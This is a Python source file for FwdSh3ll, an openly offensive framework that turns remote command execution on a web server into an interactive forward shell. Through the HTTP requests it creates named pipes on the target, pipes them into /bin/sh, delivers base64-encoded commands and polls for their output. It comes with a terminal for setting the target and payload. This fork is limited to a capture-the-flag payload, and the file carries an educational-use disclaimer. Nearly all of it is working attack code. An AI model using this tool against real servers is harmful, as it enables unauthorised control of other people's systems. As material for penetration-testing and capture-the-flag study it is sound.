#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Usage: python3 FwdSh3ll.py [-h]

"""LEGAL DISCLAIMER

FwdSh3ll was written for use in educational purposes only. Using this tool
for attacking web servers without prior mutual consistency can be considered
as an illegal activity. It is the final user's responsibility to obey all
applicable local, state and federal laws.

The author assume no liability and is not responsible for any misuse or
damage caused by this tool.
"""

"""LICENSE

Copyright (C) 2019 Sam Freeside

This file is part of FwdSh3ll.

FwdSh3ll is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

FwdSh3ll is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with FwdSh3ll.  If not, see <http://www.gnu.org/licenses/>.
"""

__author__    = 'Sam Freeside (@snovvcrash)'
__email__     = 'snovvcrash@protonmail[.]ch'
__copyright__ = 'Copyright (C) 2018 Sam Freeside'
__credits__   = ['@ippsec', '@0xdf']
__license__   = 'GPL-3.0'
__date__      = '2018-09-08'
__site__      = 'https://github.com/snovvcrash/FwdSh3ll'
__brief__     = 'Forward shell generation framework.'

import urllib3
import threading
import random
import string
import re
from importlib import import_module
from base64 import b64encode
from time import sleep
from cmd import Cmd

import requests
from termcolor import cprint

from core.updater import update
from core.parser import get_arg_parser
from core.common import BANNER


class ForwardShell:
	
	INPUT = 'fwdshin'
	OUTPUT = 'fwdshout'

	def __init__(self, url, proxy, payload_name, gen_payload, pipes_path, interval=1.3):
		self._url = url
		self._proxy = proxy
		self._payload_name = payload_name
		self._gen_payload = gen_payload
		self._interval = interval
		self._delim = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

		self.session = random.randrange(10000, 99999)
		self.stdin = f'{pipes_path}/{self.INPUT}.{self.session}'
		self.stdout = f'{pipes_path}/{self.OUTPUT}.{self.session}'

		cprint('[SHELL] Setting up forward shell on target', 'green')
		create_named_pipes = f"""/bin/bash -c 'mkfifo {self.stdin}; tail -f {self.stdin} | /bin/sh >& {self.stdout}'"""
		ForwardShell.run_raw_cmd(create_named_pipes, self._url, self._proxy, self._payload_name, self._gen_payload, timeout=0.5, first_connect=True)

		cprint('[SHELL] Setting up read thread', 'green')
		self._lock = threading.Lock()
		self.stop_thread = False
		self.thread = threading.Thread(target=self._read_cmd, args=())
		self.thread.daemon = True
		self.thread.start()

		cprint(f'[SHELL] Session path & ID: {self.stdin}, {self.stdout}', 'green')
		cprint('[SHELL] Send "kill" to terminate session\n', 'green')

	def _read_cmd(self):
		get_output = f"""/bin/bash -c '/bin/cat {self.stdout}'"""

		while True:
			result = ForwardShell.run_raw_cmd(get_output, self._url, self._proxy, self._payload_name, self._gen_payload)

			if result:
				try:
					result = re.search(rf'{self._delim}(.*?){self._delim}', result, re.DOTALL).group(1)
				except AttributeError:
					pass
				else:
					result = result.lstrip()

				with self._lock:
					print(result)

				clear_output = f"""/bin/bash -c 'echo -n > {self.stdout}'"""
				ForwardShell.run_raw_cmd(clear_output, self._url, self._proxy, self._payload_name, self._gen_payload)

			sleep(self._interval)

			if self.stop_thread:
				break

	@staticmethod
	def run_raw_cmd(cmd, url, proxy, payload_name, gen_payload, timeout=50, first_connect=False):
		if payload_name == 'HTBCTF':
			cookies, data = gen_payload(cmd)
			headers = {'User-Agent': 'Mozilla/5.0'}
		else:
			raise Exception('This fork of FwdSh3ll was made for demonstration purposes and works only with the "HTBCTF.py" payload')

		while True:
			page = b''
			try:
				with requests.post(
					url,
					headers=headers,
					cookies=cookies,
					data=data,
					proxies=proxy,
					timeout=timeout,
					verify=False,
					allow_redirects=False,
					stream=True
				) as resp:
					for i in resp.iter_content():
						page += i
				break

			except requests.exceptions.ChunkedEncodingError:
				break

			except requests.exceptions.ReadTimeout:
				return None

			except urllib3.exceptions.ConnectTimeoutError:
				cprint('[SHELL] Connection timeout error, retrying', 'yellow')
				if first_connect:
					first_connect = False
					continue
				cprint('[SHELL] Connection timeout error', 'red')
				return None

			except Exception as e:
				cprint(f'[SHELL] Exception caught: {str(e)}', 'yellow')
				return None

		return re.search(r'<pre>(.*?)</pre>', page.decode('utf-8'), re.DOTALL).group(1)

	def write_cmd(self, cmd, named_pipes=True):
		if named_pipes:
			cmd = f'echo {self._delim};' + cmd + f';echo {self._delim}\n'
			b64_cmd = b64encode(cmd.encode('utf-8')).decode('utf-8')
			unwrap_and_exec = f"""/bin/bash -c 'echo {b64_cmd} | base64 -d > {self.stdin}'"""
		else:
			cmd = f'{cmd}\n'
			b64_cmd = b64encode(cmd.encode('utf-8')).decode('utf-8')
			unwrap_and_exec = f"""/bin/bash -c 'echo {b64_cmd} | base64 -d | /bin/sh >& /dev/null'"""

		ForwardShell.run_raw_cmd(unwrap_and_exec, self._url, self._proxy, self._payload_name, self._gen_payload)
		sleep(self._interval * 1.2)


class Terminal(Cmd):

	prompt = 'FwdSh3ll> '

	def __init__(self, cli_args, all_payloads):
		super().__init__()
		self._cli_args = cli_args
		self._all_payloads = all_payloads
		self._rhost = ''
		self._rport = 80
		self._proxy = {'http': ''}
		self._payload_name = ''
		self._shell_is_running = False
		self._shell = None

	def do_show(self, opt):
		opt = opt.strip().lower()

		if opt == 'rhost':
			print()
			print(f'    RHOST: {self._rhost}')
			print()

		if opt == 'rport':
			print()
			print(f'    RPORT: {self._rport}')
			print()

		elif opt == 'proxy':
			print()
			print(f'    PROXY: {self._proxy["http"]}')
			print()

		elif opt == 'payload':
			print()
			print(f'    PAYLOAD: {self._payload_name}')
			print()

		elif opt == 'payloads':
			print()
			for i, payload in enumerate(self._all_payloads):
				print(f'    {i+1}. {payload}')
			print()

		elif opt == 'shell':
			print(f'SHELL is running: {self._shell_is_running}')

		elif opt == 'options':
			print()
			print(f'    RHOST: {self._rhost}')
			print(f'    RPORT: {self._rport}')
			print(f'    PROXY: {self._proxy["http"]}')
			print(f'    PAYLOAD: {self._payload_name}')
			print(f'    SHELL is running: {self._shell_is_running}')
			print()

		else:
			cprint('[TERM] Unknown option, try again\n', 'red')

	def do_set(self, args):
		try:
			opt, val = args.split()
		except ValueError:
			cprint('[TERM] Wrong option value, try again\n', 'red')
		else:
			opt, val = opt.strip().lower(), val.strip()

			if opt == 'rhost':
				self._rhost = f'{val}'
				print()
				print(f'    RHOST => {self._rhost}')
				print()

			elif opt == 'rport':
				self._rport = val
				print()
				print(f'    RPORT => {self._rport}')
				print()

			elif opt == 'proxy':
				self._proxy['http'] = val
				print()
				print(f'    PROXY => {self._proxy["http"]}')
				print()

			elif opt == 'payload':
				try:
					self._payload_name = int(val)
				except ValueError:
					self._payload_name = val

				if type(self._payload_name) == int:
					if self._payload_name in range(1, len(self._all_payloads) + 1):
						self._payload_name = self._all_payloads[self._payload_name - 1]
					else:
						cprint('[TERM] Payload index is out of range, try again\n', 'red')
						return

				try:
					self._payload_module = import_module(f'payloads.{self._payload_name}')
					print()
					print(f'    PAYLOAD => {self._payload_name}')
					print()
				except ModuleNotFoundError:
					cprint('[TERM] Unknown payload, try again\n', 'red')

			else:
				cprint('[TERM] Unknown option, try again\n', 'red')

	def do_cmd(self, cmd):
		if self._basic_options_are_set():
			basename, remaining = self._rhost.split('/', 1)
			url = f'http://{basename}:{self._rport}/{remaining}'
			out = ForwardShell.run_raw_cmd(cmd, url, self._proxy, self._payload_name, self._payload_module.gen_payload)
			if out is not None:
				print(out)
			else:
				cprint('[SHELL] An error has occured, try again', 'red')

	def do_spawn(self, args):
		if self._basic_options_are_set():
			basename, remaining = self._rhost.split('/', 1)
			url = f'http://{basename}:{self._rport}/{remaining}'
			if not self._shell_is_running and self._shell is None:
				self.prompt = '$ '
				self._shell = ForwardShell(url, self._proxy, self._payload_name, self._payload_module.gen_payload, self._cli_args.pipes_path)
				self._shell_is_running = True
			else:
				cprint('[TERM] SHELL is already running\n', 'red')

	def do_shell(self, cmd):
		if self._shell_is_running and self._shell is not None:
			self._shell.write_cmd(f"""/bin/bash -c '{cmd}'""")
		else:
			cprint('[TERM] SHELL is not running, spawn it first\n', 'yellow')

	def do_kill(self, args):
		if self._shell_is_running and self._shell is not None:
			cprint('[TERM] Terminating shell, cleaning up the mess...', 'green')
			stdin, stdout = self._shell.stdin, self._shell.stdout
			self._shell.stop_thread = True
			self._shell.thread.join()
			self._shell = None
			self._shell_is_running = False
			self.prompt = 'FwdSh3ll> '
			cmd = f'rm -f {self._cli_args.pipes_path}/{ForwardShell.INPUT}.* {self._cli_args.pipes_path}/{ForwardShell.OUTPUT}.*\n'
			b64_cmd = b64encode(cmd.encode('utf-8')).decode('utf-8')
			unwrap_and_exec = f"""/bin/bash -c 'echo {b64_cmd} | base64 -d | /bin/sh >& /dev/null'"""
			basename, remaining = self._rhost.split('/', 1)
			url = f'http://{basename}:{self._rport}/{remaining}'
			ForwardShell.run_raw_cmd(unwrap_and_exec, url, self._proxy, self._payload_name, self._payload_module.gen_payload)
			cprint(f'[TERM] Cleared session: {stdin}, {stdout}\n', 'green')
		else:
			cprint('[TERM] SHELL is not running\n', 'green')

	def do_EOF(self, args):
		print()
		self.do_kill(args)
		return True

	def emptyline(self):
		pass

	def _basic_options_are_set(self):
		if not self._rhost:
			cprint('[TERM] RHOST is not set\n', 'red')
			return False

		if not self._rport:
			cprint('[TERM] RPORT is not set\n', 'red')
			return False

		if not self._payload_name:
			cprint('[TERM] PAYLOAD is not set\n', 'red')
			return False

		return True


if __name__ == '__main__':
	print(BANNER)

	cli_args = get_arg_parser().parse_args()
	all_payloads = update()
	print()

	terminal = Terminal(cli_args, all_payloads)
	terminal.cmdloop()
